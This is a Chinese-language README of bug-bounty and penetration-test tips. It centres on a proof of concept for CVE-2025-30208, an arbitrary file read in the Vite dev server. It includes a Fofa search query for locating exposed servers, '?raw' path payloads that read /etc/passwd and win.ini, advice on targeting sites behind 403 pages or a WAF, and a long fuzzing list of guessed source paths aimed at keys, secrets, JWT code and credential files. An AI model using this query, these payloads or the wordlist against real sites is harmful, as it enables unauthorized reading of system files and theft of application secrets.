### 一些自己遇到的bypass场景用的脚本poc和一些挖src或者攻防的小思路，后续会慢慢搜集，感兴趣的可以关注，欢迎交流挖洞的技巧。同时，我会把最新更新的内容都放在README这里

## CVE-2025-30208
通过url去拼接下面路径来任意文件读取

Fofa测绘语句:
```
body="/@vite/client"
```
poc
```
/etc/passwd?raw"  # Linux系统文件

"/Windows/win.ini?raw" #windows文件
```
## poc就是这么简单，市面上能检索到的也挺多，不过这里添加进来也是有个思路所以记录一下

搜集完后去扫基本已经没剩几个了，很多都重复，不过有个其他的思路。讲一个小技巧，现在基本上常规的直接拼接路径已经刷烂了，不过我们可以把注意力放到一些403和有waf的网站
![a3bb815b6baee72ad140b6c829163a8](https://github.com/user-attachments/assets/bfd9424e-933d-43a1-bc16-c2f1038b47f2)

我们通过拼接这个路径去看有没有相关的内容，然后拼接一些vue开发最为熟悉的一些路径,下面为一些举例，具体还是需要看网站的线索来分析，通过一步步的扫雷式来进行扩散最后完成挖掘，这样我们就可以捡漏拿站交src了
![image](https://github.com/user-attachments/assets/a9e41bda-3973-4230-81e1-dfc6a1161890)

也是成功拼接读取，这里就贴个厚码证明可行性，再利用过程就不多说了，有这个思路大部分人就懂了，下面如今只是举例，真实的自己去进一步猜测，可以根据同一资产的类似网页来判断已经vue常用的框架结构探测，这里还有一点**读取的目录是否存在是可以探测的**,所以fuzz是一个好
办法。
以上思路仅供参考~

例如

/project/frontend/src/views/home.vue

/project/frontend/src/views/about.vue

/project/frontend/src/views/products.vue

/project/frontend/src/views/cart.vue

/project/frontend/src/views/checkout.vue

/project/frontend/src/views/orders.vue

/project/frontend/src/views/contact.vue

/project/frontend/src/views/faq.vue

/project/frontend/src/views/privacyPolicy.vue

/project/frontend/src/views/termsOfUse.vue

/project/frontend/src/views/profileEdit.vue

/project/frontend/src/views/changePassword.vue

/project/frontend/src/views/maintenance.vue

/project/frontend/src/constants/api-config.js

/project/frontend/src/constants/security-keys.js

服务类

/project/frontend/src/services/auth-handler.js

/project/frontend/src/services/cloud-service.js

/project/frontend/src/services/payment.js

页面组件
/project/frontend/src/views/admin/settings.vue

/project/frontend/src/views/admin/dashboard.vue

/project/frontend/src/views/admin/users.vue

/project/frontend/src/views/admin/orders.vue

/project/frontend/src/views/payment/confirm.vue

/project/frontend/src/views/user/security.vue

/project/frontend/src/views/user/profile.vue

/project/frontend/src/views/user/orders.vue

# 路由与状态

/project/frontend/src/router/private-routes.js

/project/frontend/src/router/admin-routes.js

/project/frontend/src/store/modules/secure-store.js

/project/frontend/src/store/modules/admin-store.js

# 后端路径
## 配置类

/project/backend/src/config/private-settings.js

/project/backend/src/config/third-party-keys.js

/project/backend/src/config/secret-manager.js

## 工具类

/project/backend/src/utils/crypto-helpers.js

/project/backend/src/utils/secure-logger.js

/project/backend/src/utils/jwt-generator.js

## 服务类
/project/backend/src/services/secure-auth.js

/project/backend/src/services/cloud-storage.js

/project/backend/src/services/payment-gateway.js
## 控制器
/project/backend/src/controllers/admin/security.js
/project/backend/src/controllers/admin/dashboard.js
/project/backend/src/controllers/admin/users.js
/project/backend/src/controllers/admin/orders.js
/project/backend/src/controllers/payment/process.js
/project/backend/src/controllers/user/credentials.js
/project/backend/src/controllers/user/profile.js
/project/backend/src/controllers/user/orders.js
